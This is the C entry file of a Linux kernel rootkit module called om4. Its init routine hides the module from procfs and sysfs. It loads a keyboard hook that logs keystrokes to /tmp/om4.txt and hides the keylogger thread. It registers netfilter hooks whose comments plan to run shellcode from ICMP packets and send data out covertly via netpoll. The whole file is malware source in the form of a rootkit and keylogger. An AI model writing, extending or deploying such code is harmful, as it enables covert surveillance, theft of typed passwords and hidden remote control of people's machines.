#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "include/om4.h"

extern int t_init(void);
extern int t_exit(void);				//from test.c

extern int lkm_net_init(void);				//from net.c
extern int lkm_net_exit(void);				//from net.c

extern int lkm_keylog_init(void);			//from keylog.c
extern int lkm_keylog_exit(void);			//from keylog.c
extern struct task_struct *lkm_keylog_task;		//from keylog.c

extern int lkm_task_init(void);				//from task.c
extern int lkm_task_exit(void);				//from task.c
extern int lkm_task_hide(struct lkm_hide_struct *ts);	//from task.c
extern int lkm_task_unhide(struct lkm_hide_struct *ts);	//from task.c
extern int lkm_task_root(struct task_struct *ts);	//from task.c
extern struct lkm_hide_struct lkm_hide_keylog;		//from task.c

extern int lkm_module_init(void); 			//from module.c
extern int lkm_module_exit(void); 			//from module.c
extern struct lkm_module_struct lkm_module_me;		//from module.c

extern unsigned long sym2addr(const char *name);	//from symb.c 
							
static int __init om4_init(void) {	
	t_init();
	/*
	 hide current module from procfs and sysfs
	 */
	lkm_module_init();	 	//module.c	
	lkm_module_exit();		//restores current module to procfs and sysfs
	return 0;
	/*
	 register hooks in netfilter.
	 to do: from net(NF_INET_PRE_ROUTING): run shellcode from icmp;
	 to net(NF_LOCAL_OUT): drops udp packets from netfilter and send them using netpoll interface.
	 */
	lkm_net_init(); 		//net.c
	/*register keyboard hook->Filter keys.
	 create thread->writes filtered keys to file(/tmp/om4.txt).
	 */
	lkm_keylog_init();		//keylog.c
	/*
	 find attach_pid->hide keylog thread
	 */
	lkm_task_init();		//task.c
	lkm_hide_keylog.task = lkm_keylog_task;
	lkm_task_hide(&lkm_hide_keylog);//task.c
	return 0;
}
static void __exit om4_exit(void) {

	lkm_task_unhide(&lkm_hide_keylog);

	lkm_task_exit();
	lkm_keylog_exit();
	lkm_net_exit();
	lkm_module_exit();		//restores current module to procfs and sysfs
	t_exit();
	return;
}

module_init(om4_init);
module_exit(om4_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("NET LKM...");
MODULE_VERSION("0.01");
